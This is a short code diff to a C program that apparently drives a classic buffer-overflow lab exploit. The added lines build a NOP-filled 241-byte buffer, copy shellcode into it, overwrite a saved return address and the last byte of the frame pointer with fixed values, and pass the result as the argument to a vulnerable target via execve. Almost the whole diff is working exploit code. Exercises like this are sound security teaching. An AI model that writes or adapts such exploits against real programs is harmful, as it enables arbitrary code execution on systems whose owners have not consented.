@@ -8,10 +8,19 @@
 
 int main(void)
 {
+  char buffer[241];
+  memset(buffer, 0x90, 241);
   char *args[3];
   char *env[1];
+  int i;
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+for(i = 0; i < strlen(shellcode); i++) {
+        buffer[191+i] = shellcode[i];
+}
+strncpy(buffer+240, "\x6c", 1);
+strncpy(buffer+236, "\xfc\xfe\xff\xbf", 4);
+
+  args[0] = TARGET; args[1] = buffer; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
@@ -19,3 +28,4 @@ int main(void)
 
   return 0;
 }
+
